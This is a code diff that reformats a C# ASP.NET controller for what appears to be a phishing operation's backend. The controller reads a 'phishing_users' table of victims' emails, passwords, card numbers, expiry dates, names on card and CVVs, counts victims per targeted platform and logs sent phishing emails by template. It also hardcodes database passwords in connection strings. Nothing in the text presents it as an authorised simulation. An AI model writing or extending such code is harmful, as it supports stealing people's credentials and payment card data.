@@ -11,7 +11,9 @@ namespace WebProject.Controllers
 {
     public class HomeController : Controller
     {
-        private readonly string connectionString = "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
+        private readonly string connectionString =
+            "Server=localhost;Port=5432;Username=erdemkurt;Password=353535;Database=phishing;";
+
         // private readonly string connectionString = "Server=localhost;Port=49152;Username=senayilmaz;Password=2002;Database=webprojectdb;";
         private readonly ILogger<HomeController> _logger;
 
@@ -175,9 +177,10 @@ namespace WebProject.Controllers
         // Retrieve user data from the database
         private List<UserModel> GetUserFromDatabase()
         {
-            string selectQuery = "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date,pu.user_name_on_card ,pu.user_cvv, pl.platform_name, pu.platform_id " +
-                                 "FROM \"phishing_users\" pu " +
-                                 "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";
+            string selectQuery =
+                "SELECT pu.user_id, pu.user_email, pu.user_password, pu.user_cc, pu.user_date,pu.user_name_on_card ,pu.user_cvv, pl.platform_name, pu.platform_id " +
+                "FROM \"phishing_users\" pu " +
+                "INNER JOIN \"platforms\" pl ON pu.platform_id = pl.platform_id";
 
             List<UserModel> phishingUserList = new List<UserModel>();
 
@@ -194,10 +197,14 @@ namespace WebProject.Controllers
                             UserModel phishingUser = new UserModel
                             {
                                 user_id = reader["user_id"] != DBNull.Value ? Convert.ToInt32(reader["user_id"]) : 0,
-                                platform_id = reader["platform_id"] != DBNull.Value ? Convert.ToInt32(reader["platform_id"]) : 0,
+                                platform_id = reader["platform_id"] != DBNull.Value
+                                    ? Convert.ToInt32(reader["platform_id"])
+                                    : 0,
                                 user_email = reader["user_email"].ToString(),
                                 user_password = reader["user_password"].ToString(),
-                                user_name_on_card = reader["user_name_on_card"] != DBNull.Value ? reader["user_name_on_card"].ToString() : null,
+                                user_name_on_card = reader["user_name_on_card"] != DBNull.Value
+                                    ? reader["user_name_on_card"].ToString()
+                                    : null,
                                 user_cc = reader["user_cc"] != DBNull.Value ? reader["user_cc"].ToString() : null,
                                 user_date = reader["user_date"] != DBNull.Value ? reader["user_date"].ToString() : null,
                                 user_cvv = reader["user_cvv"] != DBNull.Value ? reader["user_cvv"].ToString() : null
@@ -215,7 +222,8 @@ namespace WebProject.Controllers
         public Dictionary<int, int> GetPlatformCountsFromDatabase()
         {
             Dictionary<int, int> platformCounts = new Dictionary<int, int>();
-            string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";
+            string selectQuery =
+                "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";
 
             using (var connection = new NpgsqlConnection(connectionString))
             {
@@ -278,7 +286,8 @@ namespace WebProject.Controllers
         // Check if the provided credentials match an admin record in the database
         public bool CheckAdmin(AdminModel admin)
         {
-            string selectQuery = "SELECT * FROM admin WHERE admin_username = @AdminName AND admin_password = @AdminPassword";
+            string selectQuery =
+                "SELECT * FROM admin WHERE admin_username = @AdminName AND admin_password = @AdminPassword";
             bool isExecuteCorrect = false;
 
             using (var connection = new NpgsqlConnection(connectionString))
@@ -337,7 +346,8 @@ namespace WebProject.Controllers
         // Insert sent emails into the database
         private void InsertSentEmailsToDatabase(string s, int parse, DateTime now)
         {
-            string insertQuery = "INSERT INTO sent_emails(et_id, mailto, date_time) VALUES(@TemplateId, @MailTo, @Date)";
+            string insertQuery =
+                "INSERT INTO sent_emails(et_id, mailto, date_time) VALUES(@TemplateId, @MailTo, @Date)";
 
             using (var connection = new NpgsqlConnection(connectionString))
             {
@@ -384,7 +394,8 @@ namespace WebProject.Controllers
         public Dictionary<int, int> GetPlatformsFromDatabase()
         {
             Dictionary<int, int> platformCounts = new Dictionary<int, int>();
-            string selectQuery = "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";
+            string selectQuery =
+                "SELECT platform_id, COUNT(*) AS user_count FROM phishing_users WHERE platform_id IS NOT NULL GROUP BY platform_id;";
 
             using (var connection = new NpgsqlConnection(connectionString))
             {
